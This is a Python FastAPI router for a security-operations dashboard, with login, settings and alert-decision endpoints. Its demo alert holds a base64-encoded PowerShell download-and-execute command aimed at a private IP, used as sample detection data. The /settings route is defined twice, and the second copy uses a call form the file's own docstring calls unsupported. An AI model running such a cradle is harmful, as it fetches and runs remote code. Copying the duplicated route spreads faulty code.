"""Jinja2-based dashboard pages (login, dashboard, settings) + backward compat endpoints.

These routes serve the old monolithic frontend templates so users can immediately
interact with the refactored backend without waiting for the React SPA (Phase 2).

The ``/login``, ``/`` (dashboard), and ``/settings`` pages are rendered server-side.
The ``/api/alerts/generate`` and ``/api/alerts/{id}/decision`` endpoints mimic the
old monolithic API for backward compatibility.

NOTE: Starlette 1.1.0+ requires TemplateResponse(request, name, context) — not (name, context).
"""

from __future__ import annotations

from pathlib import Path
from typing import Any
from uuid import UUID, uuid4

from fastapi import APIRouter, HTTPException, Request
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates

from copilot_soc.api.auth import (
    _issue_session_token,
    _verify_password,
    require_auth,
    verify_session_token,
)
from copilot_soc.api.deps import get_db

TEMPLATE_DIR = Path(__file__).resolve().parent.parent.parent / "templates"
templates = Jinja2Templates(directory=str(TEMPLATE_DIR))

router = APIRouter(tags=["frontend"])


def _get_bootstrap_data(request: Request) -> dict[str, Any]:
    token = request.cookies.get("soc_session")
    user = verify_session_token(token) if token else None
    if not user:
        return {
            "current_user": {"username": "anonymous", "role": "analyst", "user_id": ""},
            "bootstrap_json": {"alerts": [], "settings": {}},
        }
    return {
        "current_user": {
            "username": user["user_id"][:8],
            "role": user["role"],
            "user_id": user["user_id"],
        },
        "bootstrap_json": {
            "username": user["user_id"][:8],
            "role": user["role"],
        },
    }


@router.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    """Render the login page. Redirect to dashboard if already authenticated."""
    token = request.cookies.get("soc_session")
    if token and verify_session_token(token):
        return RedirectResponse(url="/")
    error = request.query_params.get("error", "")
    return templates.TemplateResponse(
        request, "login.html",
        {"login_error": error or None},
    )


@router.post("/login")
async def login_form(request: Request):
    """Form-based login (old monolithic frontend style). Redirects on success."""
    db = await get_db()
    form = await request.form()
    username = str(form.get("username", "")).strip()
    password = str(form.get("password", ""))

    if not username or not password:
        return RedirectResponse(url="/login?error=Username+and+password+required", status_code=303)

    tenant = await db.get_tenant_by_slug("default")
    if not tenant:
        return RedirectResponse(url="/login?error=No+tenant+configured.+Run+scripts/seed.py", status_code=303)

    tenant_id = tenant["id"]
    user_record = await db.get_user_by_email(tenant_id, username)
    if not user_record or not _verify_password(password, user_record["password_hash"]):
        return RedirectResponse(url="/login?error=Invalid+username+or+password", status_code=303)

    token = _issue_session_token(str(user_record["id"]), str(tenant_id), user_record["role"])
    response = RedirectResponse(url="/", status_code=303)
    response.set_cookie(
        "soc_session", token,
        httponly=True, samesite="lax", max_age=86400 * 7,
    )
    return response


@router.post("/logout")
async def logout():
    response = RedirectResponse(url="/login", status_code=303)
    response.delete_cookie("soc_session")
    return response


@router.get("/", response_class=HTMLResponse)
async def dashboard(request: Request):
    """Main dashboard — requires authentication."""
    require_auth(request)
    return templates.TemplateResponse(
        request, "index.html",
        _get_bootstrap_data(request),
    )


@router.get("/settings", response_class=HTMLResponse)
async def settings_page(request: Request):
    require_auth(request)
    return templates.TemplateResponse(
        request, "settings.html",
        _get_bootstrap_data(request),
    )


@router.get("/settings", response_class=HTMLResponse)
async def settings_page(request: Request):
    """Tenant settings page — requires authentication."""
    require_auth(request)
    return templates.TemplateResponse(
        "settings.html",
        {"request": request, **_get_bootstrap_data(request)},
    )


@router.post("/api/alerts/generate")
async def generate_sample(request: Request):
    """Generate a sample alert for demo/testing. Created by the old frontend dashboard."""
    user = require_auth(request)
    db = await get_db()
    tenant_id = UUID(user["tenant_id"])

    alert_id = uuid4()
    raw = {
        "alert_id": str(alert_id),
        "scenario_id": f"sample_{uuid4().hex[:6]}",
        "source": "Sample Generator",
        "rule_name": "Demo Detection: Suspicious Activity",
        "summary": "Simulated security event for testing the SOC pipeline.",
        "mitre_tactic": "Execution",
        "affected_user": "jsmith",
        "affected_host": "CORP-LAPTOP-42",
        "source_ip": "10.0.0.55",
        "process_name": "powershell.exe",
        "command_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgAyADoAOAAwADAAMAAnACkA",
        "indicators": ["powershell.exe", "10.0.0.55", "-enc"],
        "telemetry": ["Process started with encoded command", "Parent: explorer.exe"],
        "analyst_supplied_severity": "Medium",
    }

    alert = await db.create_alert(
        tenant_id=tenant_id,
        source="Sample Generator",
        rule_name=raw["rule_name"],
        summary=raw["summary"],
        raw_alert=raw,
    )

    return {"status": "accepted", "id": str(alert["id"])}


@router.post("/api/alerts/{alert_id}/decision")
async def alert_decision(alert_id: str, request: Request):
    """Backward-compatible decision endpoint (old monolithic API style)."""
    user = require_auth(request)
    db = await get_db()
    tenant_id = UUID(user["tenant_id"])

    body = await request.json()
    decision_value = body.get("decision")
    if decision_value not in ("approve", "reject"):
        raise HTTPException(status_code=400, detail="decision must be 'approve' or 'reject'")

    governor_status = "approved" if decision_value == "approve" else "rejected"
    note = body.get("operator_note")

    alert = await db.get_alert(UUID(alert_id), tenant_id)
    if not alert:
        raise HTTPException(status_code=404, detail="Alert not found.")

    await db.set_governor_decision(
        alert_id=UUID(alert_id),
        tenant_id=tenant_id,
        decision=governor_status,
        governor_decision={
            "status": governor_status,
            "operator_note": note,
            "decided_at": None,
            "decided_by": user["user_id"],
        },
        user_id=UUID(user["user_id"]),
        note=note,
    )

    return {"status": governor_status, "alert_id": alert_id}
